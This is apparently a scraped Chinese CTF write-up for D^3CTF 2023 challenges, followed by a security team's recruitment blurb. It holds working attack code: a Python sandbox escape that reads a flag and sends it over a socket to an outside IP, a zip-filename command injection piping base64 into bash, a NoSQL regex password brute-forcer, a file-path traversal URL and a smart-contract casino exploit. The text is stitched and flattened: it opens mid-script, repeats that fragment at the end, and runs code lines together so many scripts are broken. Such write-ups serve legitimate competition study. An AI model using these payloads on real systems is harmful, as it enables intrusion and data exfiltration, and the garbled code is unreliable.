d3.scores(owner.address); console.log('scores', scores); } const tx = await d3.Solve({gasLimit: 3000000}); const receipt = await tx.wait(); console.log('receipt', receipt); });});

d3readfile：抓包得到接口和参数，可以任意文件读

试了一下读不到 flag，尝试一下利用 proc

是个二进制文件，也没啥用。。。读环境变量

有段base64

算是个提示，locate 命令是查询文件所在位置的，会在本地缓存数据库，不同版本似乎缓存的目录并不一样，问一下 chatgpt：

最后发现是在/var/cache/locate/located

d3gif：

from PIL import Image, ImageSequence
def get_nodes(): file_path = "./img/gif.gif" img = Image.open(file_path) iter = ImageSequence.Iterator(img) index = 0 for frame in iter: frame.save('./img/res/{0}.png'.format(index)) index += 1 print("done")
# get_nodes()new_img = Image.new('RGB',(340,340))def get_colors(): for i in range(1,1089): img = Image.open('./img/res/{0}.png'.format(i)) pixel = img.getpixel((1,1)) x = pixel[0] y = pixel[1] m = pixel[2] x = int(x) y = int(y) for i in range(x*10,x*10+10): for j in range(y*10,y*10+10): if m == 0: new_img.putpixel((i,j),(0,0,0)) else: new_img.putpixel((i,j),(255,255,255)) #print(i,pixel)get_colors()new_img.save('./img/flag.png')

FOOTER

团队简介：

      山海关安全团队(www.shg-sec.com)是一支专注网络安全的实战型团队，队员均来自国内外各大高校与企事业单位，主要从事漏洞挖掘、情报分析、反涉网犯罪研究。Arr3stY0u(意喻”逮捕你“)战队与W4ntY0u(意喻”通缉你“)预备队隶属于CTF组，我们积极参与国内外各大网络安全竞赛的同时并依托高超的逆向分析与情报分析、渗透测试技术为群众网络安全保驾护航尽一份力，简单粗暴，向涉网犯罪开炮。

 

合作事宜：

1. 案源支撑(专攻诈骗类、赌博类，无财政预算勿扰)。

2. CTF赛事支撑、线上&线下培训。

 

团队招新：

1. Web：Java，Go，Rust，Node.js，PHP等熟悉任意两种及以上代码审计，加分项：有高质量cve。

2. Crypto：熟悉数论，群论等，加分项：格大佬，会sage脚本，会做nc交互题。

3. Reverse：熟悉多种脱壳、反反调试姿势，加分项：手搓天手搓地。

4. Pwn：熟悉多种house of利用技巧，加分项：kernel，qemu等。

5. Blockchain：来者不拒，加分项：solana pwn。

其他：Android，iOS，IOT，车联网，AI，Misc等无明确标准。

联系qq2944508194（投简历到邮箱不予受理）


```
import requests, base64u = '??????????'payload = b"""__import__('os').popen("python -c 'import socket, os; flag = os.popen(\"/readflag\").read().encode();host = \"43.143.195.203\";port=1337;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((host, port));s.sendall(flag);s.close();a=1;'").read()"""payload = str(base64.b64encode(payload)).strip('b').strip("'") +"="print(payload)CMD = "ᵉval(vars(ᵉval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::
len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::
len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b1_1b_a_s_e_6_4=()))[len([])][::
len(list(dict(aa=()))[len([])])]](list(dict({}()))[len([])]))".format(payload)CMD = CMD.translate({ord(str(i)): u[i] for i in range(10)})r = requests.post("http://106.14.124.130:
31405/", data={"cmd": base64.b64encode(CMD.encode())}).textprint(r)
public function putFileAs($path, $file, $name, $options = []){ $supported_file = array('gif','jpg','jpeg','png','ico','zip','mp4','mp3','mkv','avi','txt'); $file_type= strtolower(pathinfo($name,PATHINFO_EXTENSION)); if (!in_array($file_type, $supported_file)) { return false; } $stream = fopen($file->getRealPath(), 'r+'); $result = $this->put( $path = trim($path.'/'.$name, '/'), $stream, $options ); if (is_resource($stream)) { fclose($stream); } if($file->getClientOriginalExtension() === "zip") { $fs = popen("unzip -oq ". $this->driver->getAdapter()->getPathPrefix() . $name ." -d " . $this->driver->getAdapter()->getPathPrefix(),"w"); pclose($fs); } return $result ? $path : false; }
unzip -oq /WWW/d3cloud/storage/app/1.zip -d /WWW/d3cloud/storage/app/
1;
echo Y2F0IC9mbDFBZyA+IC92YXIvd3d3L2h0bWwvcHVibGljL2ZsYWcudHh0|base64 -d|bash;.zip
import requestsimport stringpassword=""url = 'http://106.14.124.130:
30407/user/LoginIndex'while True: for c in string.printable[:-6]: if c not in ['*', '+', '.', '?', '|', '#', '&', '$']: payload = { "username": "admin", "password[$regex]": '^' + password + c } r = requests.post(url=url, data=payload,allow_redirects=False) if r.status_code==302: password += c print(password)
http://106.14.124.130:
31597/dashboardIndex/ShowExampleFile?filename[href]=a&filename[origin]=1&filename[protocol]=file:&filename[hostname]=&filename[pathname]=./%2561pp.js
{ "name": "y0ng-test", "version": "1.0.0", "description": "Example app for the Node.js Getting Started guide.", "author": "anonymous", "scripts":{ "prepack":"ls > /tmp/y0" }, "license": "MIT"}
s = "abcdefghijklmnopqrstuvwxyz0123456789~"s_arr = [ord(c) for c in s]# print(hex((~(s_arr[0] & s_arr[0])) & 0xffff)) # 0xff9e
# print(hex((~(s_arr[1] & 0xff9e)) & 0xffff)) # 0xfffd
# print(hex((~(s_arr[1] & s_arr[1])) & 0xffff)) # 0xff9d
# print(hex((~(s_arr[0] & 0xff9d)) & 0xffff)) # 0xfffe
# print(hex((~(0xfffd & 0xfffe)) & 0xffff)) # 0x3
# print(hex((~(s_arr[2] & s_arr[2])) & 0xffff)) # 0xff9c
# print(hex((~(s_arr[3] & 0xff9c)) & 0xffff)) # 0xfffb
# print(hex((~(s_arr[3] & s_arr[3])) & 0xffff)) # 0xff9b
# print(hex((~(s_arr[2] & 0xff9b)) & 0xffff)) # 0xfffc
# print(hex((~(0xfffb & 0xfffc)) & 0xffff)) # 0x7
# print(hex((~(0x3 & 0x3)) & 0xffff)) # 0xfffc
# print(hex((~(0x7 & 0xfffc)) & 0xffff)) # 0xfffb
# print(hex((~(0x7 & 0x7)) & 0xffff)) # 0xfff8
# print(hex((~(0x3 & 0xfff8)) & 0xffff)) # 0xffff
# print(hex((~(0xfffb & 0xffff)) & 0xffff)) # 0x4enc = [0x24, 0x0B, 0x6D, 0x0F, 0x03, 0x32, 0x42, 0x1D, 0x2B, 0x43, 0x78, 0x43, 0x73, 0x30, 0x2B, 0x4E, 0x63, 0x48, 0x77, 0x2E, 0x32, 0x39, 0x1A, 0x12, 0x71, 0x7A, 0x42, 0x17, 0x45, 0x72, 0x56, 0x0C, 0x5C, 0x4A, 0x62, 0x53, 0x33]# print(hex((~(enc[0] & enc[0])) & 0xffff)) # 0xffdb
# print(hex((~(0x4 & 0xffdb)) & 0xffff)) # 0xffff
# print(hex((~(0x4 & 0x4)) & 0xffff)) # 0xfffb
# print(hex((~(enc[0] & 0xfffb)) & 0xffff)) # 0xffdf
# print(hex((~(0xffff & 0xffdf)) & 0xffff)) # 0x20
input[0]^input[1]^input[2]^input[3]==enc[0]input[1]^input[2]^input[3]^input[4]==enc[1]...input[36]^input[0]^input[1]^input[2]==enc[36]
input[36]^input[3]==enc[36]^enc[0]
enc = [0x24, 0x0B, 0x6D, 0x0F, 0x03, 0x32, 0x42, 0x1D, 0x2B, 0x43, 0x78, 0x43, 0x73, 0x30, 0x2B, 0x4E, 0x63, 0x48, 0x77, 0x2E, 0x32, 0x39, 0x1A, 0x12, 0x71, 0x7A, 0x42, 0x17, 0x45, 0x72, 0x56, 0x0C, 0x5C, 0x4A, 0x62, 0x53, 0x33]flag = [0] * len(enc)flag[len(flag)-1] = 0x7Eidx = len(flag)-1while b"x00" in bytes(flag): next_idx = (idx+4) % len(flag) flag[next_idx] = flag[idx] ^ enc[idx] ^ enc[(next_idx-3) % 37] idx = next_idxprint(b"antd3ctf{"+bytes(flag)+b"}")
# antd3ctf{A_Sin91e_InS7rUcti0N_ViRTua1_M4chin3~}
pcap|http+pb1: 12: "246b.b367z303\k365tDm212366262244204D360367216241320335t306b'bt351"3: "3d354e98963a69b2"4: 605: 16809369627306: 2
aes_init((__int64)aes_ctx, 2u); v148 = (uint8_t *)_emutls_get_address((__int64)&unk_4A140); // addr: 0004A140 // 00000000: 41 20 53 49 4D 50 4C 45 20 4B 45 59 21 21 21 21 A SIMPLE KEY!!!! // 00000010: 21 21 21 21 21 21 21 21 21 21 21 21 21 21 21 21 !!!!!!!!!!!!!!!! // 00000020: 54 00 T. // data: b'A SIMPLE KEY!!!!!!!!!!!!!!!!!!!!Tx00' v149 = (char *)aes((unsigned int *)aes_ctx, s, 0x30u, v148, (__int64)iv); nullsub_1(&rc4_ctx); // addr: 0004A500 // 00000000: 53 4B 4A 3C 48 41 4E 49 4F 53 48 44 4C 4A 4B 61 SKJ<HANIOSHDLJKa // 00000010: 00 . // data: b'SKJ<HANIOSHDLJKax00' if... v150 = (char *)_emutls_get_address((__int64)&unk_4A500); sub_173B8((__int64)v150); // SKJ<HANIOSHDLJKa v151 = __strlen_chk(v150, 18u); rc4_init(&rc4_ctx, v150, v151); v152 = (jbyte *)malloc(0x21u); rc4_crypto(&rc4_ctx, v149, v152, 0x20); v153 = (*a1)->NewByteArray(a1, 0x20LL); (*a1)->SetByteArrayRegion(a1, v153, 0LL, 0x20LL, v152);
# 求逆 sboxsbox = [ 0x90, 0x7A, 0x50, 0xEF, 0xF0, 0x9C, 0x2F, 0x7D, 0xA0, 0x34, 0x23, 0xCA, 0x4F, 0x21, 0x66, 0x6B, 0x3D, 0xE0, 0xC2, 0xB3, 0xFC, 0x69, 0x08, 0xFF, 0x7F, 0x16, 0x48, 0xD5, 0xEB, 0x59, 0xD8, 0x0C, 0xF3, 0xE4, 0xA8, 0xEA, 0xB9, 0x81, 0x01, 0x28, 0x13, 0xB8, 0x6C, 0xCB, 0xDC, 0x8A, 0x27, 0x19, 0xD2, 0xA4, 0xD3, 0x99, 0x49, 0x57, 0x87, 0xDF, 0x2D, 0x4A, 0xC1, 0x58, 0xB4, 0x68, 0xDE, 0xC7, 0x94, 0x7B, 0xAA, 0xE2, 0x8C, 0x53, 0xAD, 0x1E, 0x04, 0xC5, 0x18, 0x00, 0xED, 0xF1, 0x79, 0x43, 0x51, 0xB0, 0x84, 0x5A, 0xEE, 0x97, 0x88, 0x26, 0xB6, 0x73, 0x9D, 0x5B, 0xFE, 0xE5, 0x54, 0xF4, 0xB1, 0x06, 0x3F, 0xBC, 0x31, 0x60, 0xA1, 0x85, 0xC9, 0xF8, 0xC6, 0xE7, 0xAE, 0xC3, 0x82, 0x9F, 0xFB, 0xCE, 0xFD, 0x32, 0x8D, 0x2E, 0x41, 0xBF, 0x37, 0xB7, 0xEC, 0x77, 0x02, 0x80, 0x3B, 0x76, 0x92, 0x14, 0xD0, 0x4C, 0x38, 0x89, 0x1C, 0x46, 0x2B, 0x0B, 0xC4, 0x72, 0x0E, 0xCD, 0x62, 0x10, 0x6F, 0x09, 0x8F, 0x7C, 0xD4, 0xD7, 0x6D, 0xF7, 0x9B, 0xAC, 0x20, 0x12, 0x64, 0xDD, 0xCC, 0xFA, 0x70, 0xF9, 0x35, 0x1D, 0x9A, 0x52, 0xF5, 0x0D, 0xAF, 0xBA, 0xA6, 0x30, 0x29, 0x8B, 0x7E, 0xC0, 0x83, 0x95, 0x61, 0x44, 0xA3, 0x22, 0x75, 0x5E, 0xA7, 0x55, 0x2A, 0x91, 0xF2, 0x42, 0xA2, 0x56, 0xB5, 0x5F, 0xDB, 0x36, 0x47, 0xBE, 0x86, 0xA5, 0x40, 0x15, 0x5D, 0x8E, 0xBD, 0xC8, 0x1A, 0xD1, 0x3C, 0x07, 0x11, 0x33, 0xBB, 0x6E, 0x9E, 0x96, 0x3A, 0xDA, 0x39, 0x5C, 0x2C, 0x1F, 0x17, 0xE6, 0x25, 0x6A, 0x0A, 0x3E, 0x93, 0xE9, 0x74, 0x65, 0xAB, 0x4D, 0xCF, 0xE8, 0x78, 0x0F, 0xB2, 0xE1, 0xF6, 0x71, 0x03, 0xA9, 0x1B, 0xD6, 0x63, 0x4E, 0xD9, 0x24, 0x98, 0x67, 0x45, 0x05, 0xE3, 0x4B]rsbox = [0]*0x100for i in range(0x100): rsbox[i] = sbox.index(i)print(rsbox)
from Crypto.Cipher.ARC4 import ARC4Ciphercipher = ARC4Cipher(b'SKJ<HANIOSHDLJKa')aesct = cipher.decrypt(bytes.fromhex('a6622e62f77ac35c6bf574446d8af6b2a48444f0f78ea1d0dd09c662270874e9'))print(aesct.hex()) # 43a7e60d237e472964b3b98e08f76cce938078a61bc23b32653865e3af2dfff9
static const uint8_t rsbox[256] = { 75, 38, 124, 242, 72, 253, 97, 209, 22, 145, 226, 137, 31, 167, 140, 237, 143, 210, 155, 40, 129, 201, 25, 222, 74, 47, 206, 244, 134, 163, 71, 221, 154, 13, 181, 10, 249, 224, 87, 46, 39, 172, 186, 136, 220, 56, 117, 6, 171, 100, 115, 211, 9, 162, 195, 120, 132, 218, 216, 126, 208, 16, 227, 98, 200, 118, 189, 79, 179, 252, 135, 196, 26, 52, 57, 255, 131, 233, 247, 12, 2, 80, 165, 69, 94, 185, 191, 53, 59, 29, 83, 91, 219, 202, 183, 193, 101, 178, 142, 246, 156, 231, 14, 251, 61, 21, 225, 15, 42, 150, 213, 144, 160, 241, 139, 89, 230, 182, 127, 123, 236, 78, 1, 65, 147, 7, 174, 24, 125, 37, 110, 176, 82, 103, 198, 54, 86, 133, 45, 173, 68, 116, 203, 146, 0, 187, 128, 228, 64, 177, 215, 85, 250, 51, 164, 152, 5, 90, 214, 111, 8, 102, 190, 180, 49, 199, 170, 184, 34, 243, 66, 232, 153, 70, 108, 168, 81, 96, 238, 19, 60, 192, 88, 121, 41, 36, 169, 212, 99, 204, 197, 119, 175, 58, 18, 109, 138, 73, 106, 63, 205, 104, 11, 43, 158, 141, 113, 234, 130, 207, 48, 50, 148, 27, 245, 149, 30, 248, 217, 194, 44, 157, 62, 55, 17, 239, 67, 254, 33, 93, 223, 107, 235, 229, 35, 28, 122, 76, 84, 3, 4, 77, 188, 32, 95, 166, 240, 151, 105, 161, 159, 112, 20, 114, 92, 23};
static void Cipher(state_t *state, const uint8_t *RoundKey) { uint8_t round = 0; // Add the First round key to the state before starting the rounds. AddRoundKey(0, state, RoundKey); // There will be Nr rounds. // The first Nr-1 rounds are identical. // These Nr rounds are executed in the loop below. // Last one without MixColumns() for (round = 1;; ++round) { SubBytes(state); // ShiftRows(state); if (round == Nr) { break; } MixColumns(state); // 魔改+ShiftRows ShiftRows(state); AddRoundKey(round, state, RoundKey); } // 魔改+ShiftRows ShiftRows(state); // Add round key to last round AddRoundKey(Nr, state, RoundKey);}static void InvCipher(state_t *state, const uint8_t *RoundKey) { uint8_t round = 0; // Add the First round key to the state before starting the rounds. AddRoundKey(Nr, state, RoundKey); InvShiftRows(state); // 魔改+ // There will be Nr rounds. // The first Nr-1 rounds are identical. // These Nr rounds are executed in the loop below. // Last one without InvMixColumn() for (round = (Nr - 1);; --round) { // InvShiftRows(state); // 魔改- InvSubBytes(state); AddRoundKey(round, state, RoundKey); if (round != 0) { InvShiftRows(state); // 魔改+ } if (round == 0) { break; } InvMixColumns(state); }}unsigned char hexData[32] = {0x43, 0xA7, 0xE6, 0x0D, 0x23, 0x7E, 0x47, 0x29, 0x64, 0xB3, 0xB9, 0x8E, 0x08, 0xF7, 0x6C, 0xCE, 0x93, 0x80, 0x78, 0xA6, 0x1B, 0xC2, 0x3B, 0x32, 0x65, 0x38, 0x65, 0xE3, 0xAF, 0x2D, 0xFF, 0xF9};
int main() { struct AES_ctx ctx; // AES_init_ctx_iv(&ctx, (const uint8_t *)"A SIMPLE KEY!!!!!!!!!!!!!!!!!!!!T", // (const uint8_t *)"3d354e98963a69b2"); // AES_CBC_encrypt_buffer(&ctx, hexData, 32); AES_init_ctx_iv(&ctx, (const uint8_t *)"A SIMPLE KEY!!!!!!!!!!!!!!!!!!!!T", (const uint8_t *)"3d354e98963a69b2"); AES_CBC_decrypt_buffer(&ctx, hexData, 32); DumpHex(hexData, 32); printf("%sn", hexData); return 0;}// dd4ee7c9-031c-4073-bba5-a3efa8fe+????
【管理员】d3Tetris-0wl 2023/4/29 8:33:
44d3Tetris 解出的 flag 最后请加上 "65bd" 提交，附件之后会更新
a1 = 32; v5 = (uint8_t *)0x401F13; // sleep(200)的位置 for ( i = 0; i <= 13; ++i ) { if ( v5[i] != code[i] ) { v9 = 1; break; } } if ( !IsDebuggerPresent() && !v9 ) { a2[0] = 0xA532267E; a2[1] = 0x8EFB0F27; v3[0] = 0x3C5F791A; v3[1] = 0x1A38CC77; for ( i = 0; i <= 39; ++i ) re_table[i] = 0; }
// 质因数个数 stru_4099F0.m128i_i64[0] = 0i64; stru_4099F0.m128i_i64[1] = 0i64; a1 = BN; a2 = 120ui64; // 分解质因数 factor(&a1, (__m128i *)&a2); // yafu-x64.exe factor(698740305822331500978964939673142241) // P18 = 768614336404564651 // P18 = 909090909090909091 v4 = stru_4099F0.m128i_i64[1]; a1.m128i_i64[0] = stru_4099F0.m128i_i64[0]; a1.m128i_i64[1] = v4; // 排序质因数 从小到大 sorted(xmmword_409AA0, &xmmword_409AA0[stru_4099F0.m128i_i64[0]], &a1); stru_409A00[0].m128i_i64[0] = 1i64; stru_409A00[0].m128i_i64[1] = 0i64; v15 = (__m128i)1ui64; // // 应该是去重 for ( i = 1ui64; i < (__int128)__PAIR128__(stru_4099F0.m128i_i64[1], stru_4099F0.m128i_u64[0]); i += 1ui64 ) { if ( *(_OWORD *)&xmmword_409AA0[i] == *(_OWORD *)&xmmword_409AA0[i - 1] ) { stru_409A00[v15.m128i_i64[0] - 1] = (__m128i)(*(_OWORD *)&stru_409A00[v15.m128i_i64[0] - 1] + 1i64); } else { v5 = &stru_409A00[v15.m128i_i64[0]]; v5->m128i_i64[0] = 1i64; v5->m128i_i64[1] = 0i64; *(__m128i *)&v6 = v15; *(_OWORD *)&v15 += 1ui64; v7 = &xmmword_409AA0[i]; v8 = v7->m128i_i64[1]; v6 = &xmmword_409AA0[(_QWORD)v6]; v6->m128i_i64[0] = v7->m128i_i64[0]; v6->m128i_i64[1] = v8; } } xmmword_4099A0 = v15; for ( i = 0ui64; i < (__int128)__PAIR128__(xmmword_4099A0.m128i_i64[1], xmmword_4099A0.m128i_u64[0]); i += 1ui64 ) { v9 = &xmmword_409AA0[i]; v10 = v9->m128i_i64[1]; a1.m128i_i64[0] = v9->m128i_i64[0]; a1.m128i_i64[1] = v10; BN_2_str(&a1); } for ( i = 0ui64; i <= 39; i += 1ui64 ) g_real_flag[i] ^= g_re_talbe[i]; // antd3ctf{768614336404564651909090909090909091} printf("antd3ctf{%s}n", g_real_flag);
s = "abcdefghijklmnopqrstuvwxyz0123456789"s_arr = [ord(c) for c in s]s_enc = [0xD9, 0xE4, 0x27, 0x07, 0xD0, 0xBE, 0x7B, 0xFD, 0xB8, 0x14, 0x1B, 0x32, 0xD1, 0x38, 0x0C, 0x44, 0x59, 0xE2, 0x66, 0x8C, 0x38, 0x24, 0xEA, 0x66, 0x8C, 0x65, 0xF8, 0x55, 0x60, 0x28, 0x50, 0x3A, 0x12, 0xA4, 0x78, 0x64]xor_box_1 = []for i in range(len(s_arr)): xor_box_1.append(s_arr[i] ^ s_enc[i])xor_box_2 = [0x35, 0x4B, 0xA0, 0x60, 0x08, 0x50, 0xA5, 0xF1, 0x33, 0x97, 0xB2, 0x13, 0xCB, 0x4C, 0x0D, 0xCF, 0xA3, 0x7C, 0x57, 0x53, 0xE2, 0xA9, 0x65, 0x4E, 0x0E, 0xC7, 0x7A, 0x0F, 0xFD, 0xB5, 0x9E, 0xB4, 0x33, 0xF9, 0x61, 0xD3]enc = [0xF7, 0x5F, 0xE7, 0xB0, 0x9A, 0xB4, 0xE0, 0xE7, 0x9E, 0x05, 0xFE, 0xD8, 0x35, 0x5C, 0x72, 0xE0, 0x86, 0xDE, 0x73, 0x9F, 0x9A, 0xF6, 0x0D, 0xDC, 0xC8, 0x4F, 0xC2, 0xA4, 0x7A, 0xB5, 0xE3, 0xCD, 0x60, 0x9D, 0x04, 0x1F]for i in range(0, len(enc), 2): enc[i+1] ^= xor_box_2[i+1] enc[i+1] = enc[i]-enc[i+1] enc[i+1] %= 0x100 enc[i] ^= xor_box_2[i] enc[i] = enc[i]-enc[i+1] enc[i] %= 0x100for i in range(len(enc)): enc[i] ^= xor_box_1[i]print(b"antd3ctf{"+bytes(enc)+b"}")
# antd3ctf{getting_primes_with_pipes_is_awesome}
from claripy import *from libnum import n2stmp_buf = [BVS(b'enc_tmp', 8) for i in range(36)]flag = tmp_buf[:]enc_flag = [0]*6enc_flag[0] = 0xB0800699CB89CC89enc_flag[1] = 0x4764FD523FA00B19enc_flag[2] = 0x396A7E6DF099D700enc_flag[3] = 0xB115D56BCDEAF50Aenc_flag[4] = 0x2521513C985791F4enc_flag[5] = 0x0B03C06AF93AD0BEtmp_regs = [BVV(0, 64) for i in range(4)]tmp_stack = [BVV(0, 64) for i in range(40)]flag = [BVS(f'flag{i}', 64) for i in range(6)]sp = 0
def FN_335_set_reg(a1=0, dst=0, src=0): if a1 == 1: tmp_regs[dst] = src elif a1 == 0: tmp_regs[dst] = tmp_regs[src]def FN_336_alu(fun_id=0, dst=0, src=0): match fun_id: case 0: tmp_regs[dst] += tmp_regs[src] case 1: tmp_regs[dst] -= tmp_regs[src] case 2: tmp_regs[dst] *= tmp_regs[src] case 3: tmp_regs[dst] ^= tmp_regs[src] case 4: tmp_regs[dst] <<= tmp_regs[src] case 4: tmp_regs[dst] = tmp_regs[dst].LShR(tmp_regs[src])def FN_337_push(a1=0, src=0): global sp sp += 1 dst = sp if a1 == 1: tmp_stack[dst] = src elif a1 == 0: tmp_stack[dst] = tmp_regs[src]def FN_338_pop(dst=0): global sp sp = sp value = tmp_stack[sp] sp = sp-1 tmp_regs[dst] = value
def FN_339_clear_regs(): tmp_regs[0] = 0 tmp_regs[1] = 0 tmp_regs[2] = 0 tmp_regs[3] = 0
def x_syscall(sysno, a1=0, a2=0, a3=0, a4=0): match sysno: case 335: FN_335_set_reg(a1, a2, a3) case 336: FN_336_alu(a1, a2, a3) case 337: FN_337_push(a1, a2) case 338: FN_338_pop(a1) case 339: FN_339_clear_regs() case _: print(sysno)def chal_13F5(part1, part2): x_syscall(335, 1, 0, part1) x_syscall(335, 1, 1, part2) x_syscall(337, 0, 1) x_syscall(335, 0, 2, 0) x_syscall(335, 1, 1, 3) x_syscall(336, 4, 2, 1) x_syscall(335, 1, 1, 0x51E7647E) x_syscall(336, 0, 2, 1) x_syscall(335, 0, 3, 0) x_syscall(335, 1, 1, 3) x_syscall(336, 2, 3, 1) x_syscall(335, 1, 1, 0xE0B4140A) x_syscall(336, 0, 3, 1) x_syscall(336, 3, 2, 3) x_syscall(335, 0, 3, 0) x_syscall(335, 1, 1, 0xE6978F27) x_syscall(336, 0, 3, 1) x_syscall(336, 3, 2, 3) x_syscall(338, 1) x_syscall(336, 0, 1, 2) x_syscall(337, 0, 1) x_syscall(337, 0, 0) x_syscall(335, 0, 2, 1) x_syscall(335, 1, 0, 6) x_syscall(336, 4, 2, 0) x_syscall(335, 1, 0, 0x53A35337) x_syscall(336, 0, 2, 0) x_syscall(335, 0, 3, 1) x_syscall(335, 1, 0, 5) x_syscall(336, 2, 3, 0) x_syscall(335, 1, 0, 0x9840294D) x_syscall(336, 0, 3, 0) x_syscall(336, 3, 2, 3) x_syscall(335, 0, 3, 1) x_syscall(335, 1, 0, 0x5EAE4751) x_syscall(336, 1, 3, 0) x_syscall(336, 3, 2, 3) x_syscall(338, 0) x_syscall(336, 0, 0, 2) x_syscall(337, 0, 0) x_syscall(339, 0)chal_13F5(flag[0], flag[1])chal_13F5(flag[2], flag[3])chal_13F5(flag[4], flag[5])solver = Solver()for i in range(6): solver.add(enc_flag[i] == tmp_stack[i+1])_flag = b''for x in solver.batch_eval(flag, 2): for i in x: _flag += (n2s(i)[::-1]) print(_flag)
# d3ctf{cef9b994-2547-4844-ac0d-a097b75806a0}
for ( i = 0LL; i <= 31; ++i ) { Item = _Pyx_PyInt_From_long(i); if... v23 = v10; v10 = Item; Py_XDECREF(v23); Item = _Pyx_PyObject_GetItem(a2, Item); if... if ( (unsigned int)PyType_HasFeature(*(_QWORD *)(Item + 8), 0x10000000LL) ) v2 = (unsigned int)sub_5A374B(Item); else v2 = sub_5A3D44(Item); v24 = v2; if... Py_DECREF(Item); Item = 0LL; if ( (unsigned int)_Pyx_PyByteArray_Append(v9, v24 ^ 0x23u) == -1 ) { v18 = off_A7A208; v6 = 34; v7 = 2138; goto LABEL_60; } } for ( j = 0LL; j <= 29; ++j ) { Item = _Pyx_PyInt_From_long(j); if... v22 = v10; v10 = Item; Py_XDECREF(v22); Item = _Pyx_PyObject_GetItem(v9, Item); if... v16 = _Pyx_PyInt_AddObjC(v10, qword_ABC1E8, 2LL, 0LL, 0LL); if... v17 = _Pyx_PyObject_GetItem(v9, v16); if... Py_DECREF(v16); v16 = PyNumber_Add(Item, v17); if... Py_DECREF(Item); Item = 0LL; Py_DECREF(v17); v17 = _Pyx_PyInt_AndObjC(v16, qword_ABC220, 255LL, 0LL, 0LL); if... Py_DECREF(v16); v16 = _Pyx_PyInt_XorObjC(v17, qword_ABC218, 84LL, 0LL, 0LL); if... Py_DECREF(v17); v17 = 0LL; if ( (int)PyObject_SetItem(v9, v10, v16) < 0 ) { v18 = off_A7A208; v6 = 36; v7 = 2178; goto LABEL_60; } Py_DECREF(v16); v16 = 0LL; }
from claripy import *from Crypto.Cipher.ARC4 import ARC4Ciphertmp_buf = [BVS(b'enc_tmp', 8) for i in range(32)]flag = tmp_buf[:]enc_flag = bytes.fromhex( 'd3c7ceca3f84dbb3b6b980ead0cd72fcd83095dbe2d89208c1c6c5f407ec025e')for j in range(32): tmp_buf[j] ^= 0x23for j in range(30): tmp_buf[j] = ((tmp_buf[j] + tmp_buf[j+2]) & 0xFF) ^ 0x54solver = Solver()for i in range(32): solver.add(enc_flag[i] == tmp_buf[i]) # solver.add(flag[i] >= 32) # solver.add(flag[i] <= 127)for x in solver.batch_eval(flag, 50): b = bytes(x) print(b) print(b.hex())
# b'flag{y0U_RE_Ma5t3r_0f_R3vocery!}'
msg.sender 要是个 < 100 bytes 的合约要返回正确的 rand要使得 msg.sender 的 address 和 tx.origin 的 address 有相同的 00 byte 位
- assembly / opcode 直接写合约- rand 依赖 block.timestamp, block.difficulty, 在同一个 tx 中是不变的, 在攻击合约中同样可以计算- 用私钥凑 tx.origin 的地址 ([bokub/vanity-eth: Browser-based ETH vanity address generator (github.com)](https://github.com/bokub/vanity-eth)), 用 create2 凑攻击合约的地址, 凑前两位是 00 00, 总共重复攻击 5 次
contract Attack {address public exp;event Deployed(address x);function deploy(bytes memory bytecode, bytes32 salt) public returns (address addr) {assembly {addr := create2(0, add(bytecode, 32), mload(bytecode), salt)if iszero(extcodesize(addr)) { revert(0, 0) }}emit Deployed(addr);
return addr;}function deploy_exp(bytes32 salt, address casino_addr) public {bytes memory exp_code_pre = hex"6059600d60003960596000f3fe600036111560385773";bytes memory exp_code_post = hex"60006311610c2581526020816004601c84016000865af1600080f35b42600052306034524460205260546000206011810690508060005260206000f3";bytes memory exp_code = abi.encodePacked(exp_code_pre, bytes20(casino_addr), exp_code_post);exp = deploy(exp_code, salt);casino = D3Casino(casino_addr);}function attack() public {(bool success,) = exp.call("0x");}}
object "Exp" { code { // Deploy the contract datacopy(0, dataoffset("runtime"), datasize("runtime")) return(0, datasize("runtime")) } object "runtime" { code { if gt(calldatasize(), 0) { // call bet let addr := 0x348fab138Ec760eBd0A7751225E6F632C6f5715f let x := 0 mstore(x, 0x11610c25) let success := call(gas(), addr, 0, add(x, 28), 4, x, 0x20) return(0, 0) } // test calc rand mstore(0, timestamp()) mstore(52, address()) mstore(32, difficulty()) let rand := keccak256(0, 84) rand := mod(rand, 17) // return rand mstore(0, rand) return(0, 0x20) } }}
const { ethers } = require('hardhat');function calc_salt(addr, casino_addr, from=0, count=5) { var salt = BigInt(from); var target_code = "0x" + "6059600d60003960596000f3fe600036111560385773" + casino_addr.slice(2) + "60006311610c2581526020816004601c84016000865af1600080f35b42600052306034524460205260546000206011810690508060005260206000f3"; var cnt = 0; var res = Array(count).fill(0); while (true) { var salt_str = "0x" + salt.toString(16).padStart(64, '0'); create_addr = ethers.utils.solidityKeccak256( ['bytes1', 'address', 'bytes32', 'bytes32'], ['0xff', addr, salt_str, ethers.utils.solidityKeccak256(['bytes'], [target_code])] ).slice(26); if (create_addr.startsWith('0000')) { console.log('find salt:', salt_str); console.log('create_addr:', create_addr); res[cnt] = salt_str; cnt += 1; if (cnt == count) { break; } } salt++; } return res;}describe('Test', function() { it('D3', async function() { const D3 = await ethers.getContractFactory('D3Casino'); const Attack = await ethers.getContractFactory('Attack'); const casino_addr = '0x1ac02a58e9e8fC1031EC713a23F8D2491df98fEd'; const attack = await Attack.deploy(); await attack.deployed(); const d3 = D3.attach(casino_addr); console.log('attack', attack.address); console.log('exp', await attack.exp()); const [owner] = await ethers.getSigners(); console.log('owner', owner.address); console.log('balance', ethers.utils.formatEther(await ethers.provider.getBalance(owner.address))); console.log('d3', d3.address); console.log('scores', await d3.scores(owner.address)); var salt_arr = calc_salt(attack.address, d3.address); for (var i = 0; i < salt_arr.length; i++) { console.log('salt', salt_arr[i]); await attack.deploy_exp(salt_arr[i], d3.address, {gasLimit: 3000000}); await new Promise(r => setTimeout(r, 10000)); var exp_addr = await attack.exp(); console.log('exp_addr', exp_addr); await attack.attack({gasLimit: 3000000}); await new Promise(r => setTimeout(r, 10000)); var betrecord = await d3.betrecord(exp_addr); console.log('betrecord', betrecord); var scores = await d3.scores(owner.address); console.log('scores', scores); } const tx = await d3.Solve({gasLimit: 3000000}); const receipt = await tx.wait(); console.log('receipt', receipt); });});
from PIL import Image, ImageSequence
